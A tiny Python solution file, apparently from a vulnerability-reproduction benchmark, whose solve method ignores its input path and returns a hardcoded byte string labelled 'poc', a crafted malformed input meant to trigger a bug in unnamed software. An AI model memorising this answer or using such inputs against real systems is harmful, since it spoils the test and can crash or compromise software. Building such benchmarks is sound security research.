class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x10\x10\x00\x80\x00\x21\x00\x00\x00\x01\x00\x00\x00\x01\x00\x20' + b'\x00' * 17
        return poc
